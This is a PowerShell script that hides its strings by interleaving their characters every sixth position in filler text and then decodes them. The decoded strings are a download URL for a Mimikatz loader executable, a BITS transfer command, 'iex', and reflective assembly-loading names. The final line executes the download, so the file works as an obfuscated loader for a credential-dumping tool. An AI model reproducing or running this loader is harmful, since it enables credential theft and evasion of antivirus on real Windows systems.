Function CreateRandom($arg, $userText){
    $website = $userText.ToCharArray();
    $arg = $arg.ToCharArray();
    $six = 5;
    $six++;
    $j = 0;


    For($i=5; $i -lt $arg.Length-1; $i+=$six){
        if($j -lt $userText.Length){
            $arg[$i] = $website[$j]
            $j++;        
        }
        
    }
    $result = [String]::new($arg)
    $reste = $arg.Length % ($userText.Length*6)
    if ($reste -ne 0){
        $result2 = $result.Substring(0, ($userText.Length*6)+1);
    }
    else {
        $result2 = $result2 + "a";
    }

    return $result2

}


Function MakeItClear($arg){
    $six = 5;
    $six++; 

    For($i = 5; $i -lt $arg.Length-1; $i+=$six){
        $subString = 'sub' + 'string';
        $sixth_char = $arg.$subString.Invoke($i, 1);
        $returned_string = $returned_string + $sixth_char;
    }
    return $returned_string;
}

$website_randomize = CreateRandom "abxyijkllvwxklvwxnopqrsyzoqmnopqrstuxklvwxyzopqmnowxyzo`
pqrmnopqrstuvwxyzopqryzopyzopqmzdefgyzcijstuvwzonokijkllvxxyzdef`
nokijkghijstuvwxokghijyzonokghiqrstuzokijkllvwxklwxyzopqmnopqmno`
xyzonojlvvwxnopqrsyzopwxyzopqryzonopqrstuvwyzonokijklxyzonokpqmn`
qrszonokia" "https://hakkyahud.github.io/LoadMimikatz.exe";

Write-Host "Randomize website: "$website_randomize

$website = MakeItClear($website_randomize)
Write-Host "Clear website: "$website

$dd_randomize = CreateRandom "abxyijkllvwxklvwxnopqrsyzoqmnopqrstuxklvwxyzopqmnowxyzo`
pqrmnopqrstuvwxyzopqryzopyzopqmzdefgyzcijstuvwzonokijkllvxxyzdef`
nokijkghijstuvwxokghijyzonokghiqrstuzokijkllvwxklwxyzopqmnopqmno`
xyzonojlvvwxnopqrsyzopwxyzopqryzonopqrstuvwyzonokijklxyzonokpqmn`
qrszonokia" "Start-BitsTransfer -source \$website"

Write-Host "Randomize command: "$dd_randomize

$dd = MakeItClear($dd_randomize);
Write-Host "Clear command: "$dd


$iex_randomize = CreateRandom "abxyijkllvwxklvwxnopqrsyzoqmnopqrstuxklvwxyzopqmnowxyzo`
pqrmnopqrstuvwxyzopqryzopyzopqmzdefgyzcijstuvwzonokijkllvxxyzdef`
nokijkghijstuvwxokghijyzonokghiqrstuzokijkllvwxklwxyzopqmnopqmno`
xyzonojlvvwxnopqrsyzopwxyzopqryzonopqrstuvwyzonokijklxyzonokpqmn`
qrszonokia" "iex"

$iex = MakeItClear($iex_randomize)
Write-Host $iex

$assembly_randomize = CreateRandom "abxyijkllvwxklvwxnopqrsyzoqmnopqrstuxklvwxyzopqmnowxyzo`
pqrmnopqrstuvwxyzopqryzopyzopqmzdefgyzcijstuvwzonokijkllvxxyzdef`
nokijkghijstuvwxokghijyzonokghiqrstuzokijkllvwxklwxyzopqmnopqmno`
xyzonojlvvwxnopqrsyzopwxyzopqryzonopqrstuvwyzonokijklxyzonokpqmn`
qrszonokia" "[System.Reflection.Assembly]::Load"

$assembly_load = MakeItClear($assembly_randomize)
Write-Host $assembly_load

$entryPoint_randomize = CreateRandom "abxyijkllvwxklvwxnopqrsyzoqmnopqrstuxklvwxyzopqmnowxyzo`
pqrmnopqrstuvwxyzopqryzopyzopqmzdefgyzcijstuvwzonokijkllvxxyzdef`
nokijkghijstuvwxokghijyzonokghiqrstuzokijkllvwxklwxyzopqmnopqmno`
xyzonojlvvwxnopqrsyzopwxyzopqryzonopqrstuvwyzonokijklxyzonokpqmn`
qrszonokia" "EntryPoint"

$entrypoint = MakeItClear($entryPoint_randomize)

$invoke_randomize = CreateRandom "abxyijkllvwxklvwxnopqrsyzoqmnopqrstuxklvwxyzopqmnowxyzo`
pqrmnopqrstuvwxyzopqryzopyzopqmzdefgyzcijstuvwzonokijkllvxxyzdef`
nokijkghijstuvwxokghijyzonokghiqrstuzokijkllvwxklwxyzopqmnopqmno`
xyzonojlvvwxnopqrsyzopwxyzopqryzonopqrstuvwyzonokijklxyzonokpqmn`
qrszonokia" "Invoke"

$invoke = MakeItClear($invoke_randomize)

&($iex) ($dd) $website
